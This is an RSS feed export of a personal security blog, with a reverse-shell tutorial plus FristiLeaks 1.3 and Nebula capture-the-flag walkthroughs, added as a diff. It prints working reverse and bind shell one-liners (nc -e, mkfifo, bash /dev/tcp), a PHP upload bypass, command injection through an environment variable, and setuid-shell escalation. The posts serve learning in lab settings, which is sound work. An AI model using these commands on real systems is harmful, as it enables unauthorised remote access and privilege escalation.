@@ -1,0 +1,530 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Linux &#8211; Graeme Robinson&#039;s blog</title>
+	<atom:link href="/category/unix/linux/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A place for my thoughts when I was starting to break into the information security feild</description>
+	<lastBuildDate>Sun, 29 Apr 2018 13:52:23 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.6.2</generator>
+	<item>
+		<title>Reverse shells even without nc on Linux</title>
+		<link>/reverse-shells-even-without-nc-on-linux/</link>
+					<comments>/reverse-shells-even-without-nc-on-linux/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 29 Apr 2018 13:49:55 +0000</pubDate>
+				<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=335</guid>
+
+					<description><![CDATA[Often when I get remote command execution on a linux system for example I&#8217;ve planted my one line php script , the next step is getting a remote shell. Usually an nc listener would be used to receive the reverse &#8230; <a href="/reverse-shells-even-without-nc-on-linux/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Often when I get remote command execution on a linux system for example I&#8217;ve planted my <a href="/single-line-php-script-to-gain-shell/">one line php script</a> , the next step is getting a remote shell. Usually an nc listener would be used to receive the reverse shell, and I normally start it with the -v option so that it will show when a connection is received.</p>
+<p>If nc or ncat is installed, it should be fairly simple to send the shell to my listener. Something like this should send a reverse shell to a nc listener, running on DEST_IP:DEST_PORT:</p>
+<pre>nc DEST_IP DEST_PORT -e /bin/bash</pre>
+<p>or I could set up a bind shell on the system then connect to it later using nc:</p>
+<pre>nc -lp 4444 -e /bin/bash</pre>
+<p>It should be noted that some versions of nc (e.g. BSD) don&#8217;t need the -p option if -l is specified (in fact it is not valid to use -p with -l on those versions), and some don&#8217;t have the -e option.</p>
+<p>It may be even better to use the -c switch instead of -e if it is available because then you can pass more than an executable name to execute. This example forwards stderr as well as stdout from bash:</p>
+<pre>nc DEST_IP DEST_PORT -c "/bin/bash 2&gt;&amp;1"</pre>
+<p>If there is no -e option, there are ways around it. One example is to use two nc listeners connected to bash, one to send commands and one to receive output:</p>
+<pre>nc DEST_IP DEST_PORT | /bin/bash 2&gt;&amp;1 | nc DEST_IP DEST_PORT+1</pre>
+<p>This is not very elegant, but it does work. We can temporarily create a named pipe and use that to connect to a single nc listener:</p>
+<pre>mkfifo /tmp/pipe;cat /tmp/pipe|nc DEST_IP DEST_PORT|/bin/bash &amp;&gt;/tmp/pipe;rm /tmp/pipe</pre>
+<p>There might also be ncat available on the system, which can be used just like nc in the first 4 examples above, and ncat provides options like &#8211;ssl which can be used to encrypt traffic and even verify identity..</p>
+<p>If no versions of netcat are installed, we can always try bash redirection. Check whether commands are running inside bash with:</p>
+<pre>$echo $0</pre>
+<p>or:</p>
+<pre>echo $SHELL</pre>
+<p>If commands are running in bash, then great, we can use bash&#8217;s tcp redirections like this:</p>
+<pre>bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1</pre>
+<p>This will execute bash, and forward stdout and stderr to DEST_IP:DEST_PORT and read stdin from the same. If I set up a nc listener on DEST_PORT:DEST_IP beforehand I should receive a shell.</p>
+<p>If commands are running in something like sh, which doesn&#8217;t have tcp redirection, we can check whether bash is installed with:</p>
+<pre>which bash</pre>
+<p>an if it is, just execute the commands inside bash to get redirection:</p>
+<pre>bash -c "bash &amp;&gt;/dev/tcp/DEST_IP/DEST_PORT &lt;&amp;1"</pre>
+<p>When sending these commands in a query string (e.g to a backdoor php file), watch out for url escaping the commands. If you&#8217;re typing them into the address bar, most browsers will url escape the characters, but ampersand (&#8220;&amp;&#8221;) often catches me out because it&#8217;s valid in a url as a query string delimiter, so it won&#8217;t be escaped for you.</p>
+<p>If there are no versions of netcat or bash installed, then it might be time to start investigating other using other languages (e.g. perl/python) to send the shell over tcp which is outside the scope of this post.</p>
+<p>Once you have a remote shell, executing interactive tools like sudo and passwd won&#8217;t work, but if python is installed, this one liner will make them work:</p>
+<pre>python -c "import pty;pty.spawn('/bin/bash')"</pre>
+<p>I&#8217;m sure it&#8217;s possible do similar things in other languages if python isn&#8217;t installed.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/reverse-shells-even-without-nc-on-linux/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>FristiLeaks 1.3</title>
+		<link>/fristileaks-1-3/</link>
+					<comments>/fristileaks-1-3/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 22 Oct 2017 11:29:27 +0000</pubDate>
+				<category><![CDATA[Compromise]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Passwords]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<guid isPermaLink="false">/?p=321</guid>
+
+					<description><![CDATA[Following on from my previous post about Kioptrix 2014, this post will be about how I got root on the next VM in the list, which is FristiLeaks 1.3 So the first thing I did after turning the VM on &#8230; <a href="/fristileaks-1-3/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/fristileaks-1-3/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 06</title>
+		<link>/exploit-exercises-nebula-level-06/</link>
+					<comments>/exploit-exercises-nebula-level-06/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 23:59:23 +0000</pubDate>
+				<category><![CDATA[Brute Force]]></category>
+		<category><![CDATA[Crack]]></category>
+		<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Hash]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[John The Ripper]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=215</guid>
+
+					<description><![CDATA[Even less information about this one: The flag06 account credentials came from a legacy unix system. To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06. &#8230; <a href="/exploit-exercises-nebula-level-06/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Even less information about this one:</p>
+<p style="padding-left: 30px;">The flag06 account credentials came from a legacy unix system.<br />
+To do this level, log in as the level06 account with the password level06 . Files for this level can be found in /home/flag06.</p>
+<p>I had a good idea what I&#8217;m looking for here, an easy to crack password hash in /etc/passwd rather than in the shadow file, so:</p>
+<pre lang="Bash">cat /etc/passwd | grep flag06</pre>
+<p>shows me the hash is ueqwOCnSGdsuM. I need to &#8220;crack&#8221; the hash. Time to get john the ripper on the case. At this point I didn&#8217;t have any other linux machines to hand, so I went to another tty session on this one and logged in a nebula and installed john (<strong>sudo apt-get install john</strong>). Then I ran john on the password file (<strong>john /etc/passwd</strong>) and he showed me the password. I switched over to flag06 account and the password worked as expected.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-06/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 05</title>
+		<link>/exploit-exercises-nebula-level-05/</link>
+					<comments>/exploit-exercises-nebula-level-05/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 23:44:00 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=210</guid>
+
+					<description><![CDATA[Not much information to start on this one: Check the flag05 home directory. You are looking for weak directory permissions To do this level, log in as the level05 account with the password level05 . Files for this level can be found in /home/flag05. The command &#8230; <a href="/exploit-exercises-nebula-level-05/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Not much information to start on this one:</p>
+<p style="padding-left: 30px;">Check the <em>flag05</em> home directory. You are looking for weak directory permissions<br />
+To do this level, log in as the <em>level05</em> account with the password <em>level05</em> . Files for this level can be found in /home/flag05.</p>
+<p>The command <strong>ll</strong> (an alias for <strong>ls-alF</strong>) showed me that I had read access to ~flag05/.backup, and in there was a backup gzipped tar. Hopefully some goodies in here&#8230;</p>
+<p>I unpacked the tar and found that it contained a folder called .ssh. This is used for secure shell authentication. That folder contained a private/public key pair and an authorized_keys file. The authorised_keys file is exactly the same as the public key file, so (assuming that the authorised_keys file had not been deleted since the backup) I should be able to ssh in using the private key, as long as it was not encrypted with a passphrase.</p>
+<p>I copied the id_rsa file to ~/.ssh and tried to connect using:</p>
+<pre lang="Bash">ssh flag05@localhost</pre>
+<p>Bingo!</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-05/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 04</title>
+		<link>/exploit-exercises-nebula-level-04/</link>
+					<comments>/exploit-exercises-nebula-level-04/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 23:28:27 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=206</guid>
+
+					<description><![CDATA[The information about this level says: This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it 🙂 To do this level, log in as the level04 account with the &#8230; <a href="/exploit-exercises-nebula-level-04/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>The information about this level says:</p>
+<p style="padding-left: 30px;">This level requires you to read the <em>token</em> file, but the code restricts the files that can be read. Find a way to bypass it <img src="https://s.w.org/images/core/emoji/15.0.3/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
+To do this level, log in as the <em>level04</em> account with the password <em>level04</em> . Files for this level can be found in /home/flag04.</p>
+<p>It also contains some source code:</p>
+<pre lang="C" line="1">
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+    char buf[1024];
+    int fd, rc;
+
+    if(argc == 1) {
+        printf("%s [file to read]\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    if(strstr(argv[1], "token") != NULL) {
+        printf("You may not access '%s'\n", argv[1]);
+        exit(EXIT_FAILURE);
+    }
+
+    fd = open(argv[1], O_RDONLY);
+    if(fd == -1) {
+        err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+    }
+
+    rc = read(fd, buf, sizeof(buf));
+
+    if(rc == -1) {
+        err(EXIT_FAILURE, "Unable to read fd %d", fd);
+    }
+
+    write(1, buf, rc);
+}
+</pre>
+<p>Its fairly clear from looking at the files and the source code (I will admit I had to use a lot of <strong>man</strong> to help me understand the source code) that I want to read the contents of &#8220;token&#8221;, but the program won&#8217;t allow it. I tried things like <strong>./token</strong> and <strong>../flag04/token</strong>, but that didn&#8217;t work because the program is just searching for the string &#8220;token&#8221; anywhere in the first argument. Well&#8230; how do I get the contents of that file &#8220;into&#8221; another file without having permission to read the file? Symbolic link! Here&#8217;s what I did:</p>
+<pre lang="Bash" line="1">
+ln -s ~flag04/token /tmp/link
+~flag04/flag04 /tmp/link
+</pre>
+<p>It turns out that the contents of the token file is the password for the flag04 account so I just did su flag04 and used that password. I ran getflag and violà!</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-04/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 03</title>
+		<link>/exploit-exercises-nebula-level-03/</link>
+					<comments>/exploit-exercises-nebula-level-03/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 23:10:15 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=198</guid>
+
+					<description><![CDATA[The information about this level says: Check the home directory of flag03 and take note of the files there. There is a crontab that is called every couple of minutes. To do this level, log in as the level03 account with the password level03 . Files &#8230; <a href="/exploit-exercises-nebula-level-03/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>The information about this level says:</p>
+<p style="padding-left: 30px;">Check the home directory of <em>flag03</em> and take note of the files there.<br />
+There is a crontab that is called every couple of minutes.<br />
+To do this level, log in as the <em>level03</em> account with the password <em>level03</em> . Files for this level can be found in /home/flag03.</p>
+<p>Well looking in ~flag03 there is just one directory (writable.d) file and one file (writable.sh). I&#8217;m assuming that the cron job runs writable.sh every couple of minutes so I looked at that script. I can see that the script runs every file in the writable.d folder (which we have write access to), but will kill the process if it takes longer than 5 seconds. It then removes the file.</p>
+<p>What we could do is make a quick bash script that will run getflag and save the output like this:</p>
+<pre lang="Bash" line="1">#!/bin/sh
+getflag > /tmp/getflag.out</pre>
+<p>Which works (after we wait for the cron job to run it), but I want shell! So we&#8217;re going to borrow a trick from level01 and create a program that will launch a bash shell and get flag03 to set the setuid bit.</p>
+<p>My C program looks like this:</p>
+<pre lang="C" line="1">
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+int main() {
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, id, gid);
+    setresuid(uid, uid, uid);
+
+    system("/bin/bash");
+}
+</pre>
+<p>Now I just compile it with gcc and drop it in /tmp so that flag03 can access it. All I need the cron job to do now is make a copy and set the setuid bit, so here is the script I dropped in ~flag03/writable.d:</p>
+<pre lang="bash" line="1">
+#!/bin/sh
+cp /tmp/setuidshell /tmp/setuidshell2
+chmod u+s /tmp/setuidshell2
+</pre>
+<p>This got me a program (/tmp/setuidshell2) in that gave me shell. From here I was able to run <strong>getflag</strong>, and also to run <strong>crontab -l</strong> to see that the cron job is actually called every 3 minutes.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-03/feed/</wfw:commentRss>
+			<slash:comments>5</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 02</title>
+		<link>/exploit-exercises-nebula-level-02/</link>
+					<comments>/exploit-exercises-nebula-level-02/#comments</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Thu, 29 Nov 2012 19:12:56 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=165</guid>
+
+					<description><![CDATA[The information about this level says: There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? To do this level, log in as the level02 account with the password level02 . Files for this level &#8230; <a href="/exploit-exercises-nebula-level-02/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>The information about this level says:</p>
+<p style="padding-left: 30px;">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br />
+To do this level, log in as the <em>level02</em> account with the password <em>level02</em> . Files for this level can be found in /home/flag02.</p>
+<p>It also contains some source code:</p>
+<pre lang="C" line="1">
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+    char *buffer;
+
+    gid_t gid;
+    uid_t uid;
+
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    buffer = NULL;
+
+    asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+    printf("about to call system(\"%s\")\n", buffer);
+
+    system(buffer);
+}</pre>
+<p>This is similar to the Level 01. An environment variable $USER is being used to construct a string that is printed to the screen before being run. If we can edit that environment variable, we can inject a malicious command.</p>
+<p>Initially I changed $USER so that running the program would execute getflag. The command I used was:</p>
+<pre lang="Bash">USER=;getflag;echo</pre>
+<p>I&#8217;ll break this down:<br />
+<strong>;</strong> &#8211; end the command and start a new one<br />
+<strong>getflag</strong> &#8211; run the getflag program<br />
+<strong>;</strong> &#8211; end the command and start a new one<br />
+<strong>echo</strong> &#8211; start a new echo command so that the following arguments don&#8217;t cause an error</p>
+<p>This results in the following command being run:</p>
+<pre lang="Bash">/bin/echo ;getflag;echo is cool</pre>
+<p>I got a success message from get flag, but I wanted shell, so I changed my command to:</p>
+<pre lang="Bash">USER="Opening escalated shell...;bin/bash;echo Closing pwned shell, now that"</pre>
+<p>This time I got shell, and some cool text when going into the shell and when coming out (after typing exit)</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/exploit-exercises-nebula-level-02/feed/</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Exploit Exercises – Nebula – Level 01</title>
+		<link>/exploit-exercises-nebula-level-01/</link>
+					<comments>/exploit-exercises-nebula-level-01/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Wed, 28 Nov 2012 15:01:30 +0000</pubDate>
+				<category><![CDATA[Exploit]]></category>
+		<category><![CDATA[Exploit Excercises]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<guid isPermaLink="false">/?p=149</guid>
+
+					<description><![CDATA[Following on from my previous post this one is about level01 of Nebula on exploit-excercises.com. The information about this level says: There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it? To &#8230; <a href="/exploit-exercises-nebula-level-01/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Following on from <a title="grobinson.me: Exploit Excercises - Nebula - Level 00" href="/exploit-exercises-nebula-level-00/" target="_blank">my previous post</a> this one is about <a title="Level 01" href="http://exploit-exercises.com/nebula/level01" target="_blank">le</a><a title="Nebula - Level 01" href="http://exploit-exercises.com/nebula/level01" target="_blank">vel01 of Nebula</a> on <a title="Exploit Exercises" href="http://exploit-exercises.com/" target="_blank">exploit-excercises.com</a>. The information about this level says:</p>
+<p style="padding-left: 30px;">There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?<br />
+To do this level, log in as the level01 account with the password level01 . Files for this level can be found in /home/flag01.</p>
+<p>It also contains some source code:</p>
+<pre lang="C" line="1">
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    system("/usr/bin/env echo and now what?");
+}
+</pre>
+<p>I&#8217;m not all that familiar with C (I&#8217;m more of a scripter), but I can understand enough; this appears to basically sets all uids for the process to the effective uid (presumably the setuid bit is present) and then calls a command line of:</p>
+<pre lang="Bash">/usr/bin/env echo and now what?</pre>
